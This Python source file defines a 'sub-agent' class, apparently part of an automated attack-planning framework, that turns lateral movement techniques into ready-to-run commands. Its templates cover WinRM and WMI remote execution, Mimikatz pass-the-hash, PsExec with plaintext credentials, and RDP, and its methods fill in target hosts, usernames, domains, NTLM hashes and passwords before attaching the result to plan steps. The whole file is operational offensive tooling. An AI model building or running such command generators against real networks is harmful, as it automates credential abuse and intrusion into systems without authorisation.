from typing import Dict, Optional
from src.models.plan_step import PlanStep


class CommandSynthesizer:
    """
    Sub-agent responsible for mapping lateral movement techniques to operational
    command-line syntax templates and formatting parameters (credentials, targets, shares).
    """

    TEMPLATES: Dict[str, str] = {
        "WinRM": "Invoke-Command -ComputerName {target_host} -ScriptBlock {{ {command} }}",
        "WMI": "wmic /node:{target_host} process call create \"{command}\"",
        "Pass-the-Hash": "mimikatz.exe \"sekurlsa::pth /user:{username} /domain:{domain} /ntlm:{ntlm_hash} /run:\\\"{command}\\\"\"",
        "PsExec": "psexec.exe \\\\{target_host} -u {domain}\\{username} -p {password} {command}",
        "RDP": "mstsc.exe /v:{target_host}"
    }

    def generate_command(
            self,
            technique_name: str,
            target_host: str,
            command: str = "whoami",
            username: Optional[str] = "Administrator",
            domain: Optional[str] = "CORP",
            ntlm_hash: Optional[str] = "31d6cfe0d16ae931b73c59d7e0c089c0",
            password: Optional[str] = "Password123!"
    ) -> str:
        """Synthesizes a concrete command string based on technique template and parameters."""
        template = self.TEMPLATES.get(
            technique_name,
            "{command} # Executed against {target_host}"
        )

        return template.format(
            target_host=target_host,
            command=command,
            username=username,
            domain=domain,
            ntlm_hash=ntlm_hash,
            password=password
        )

    def populate_step_command(
            self,
            step: PlanStep,
            command: str = "whoami",
            username: str = "Administrator",
            domain: str = "CORP",
            ntlm_hash: str = "31d6cfe0d16ae931b73c59d7e0c089c0"
    ) -> PlanStep:
        """Injects the synthesized command directly into a PlanStep model instance."""
        step.execution_command_template = self.generate_command(
            technique_name=step.technique_name,
            target_host=step.target_host,
            command=command,
            username=username,
            domain=domain,
            ntlm_hash=ntlm_hash
        )
        return step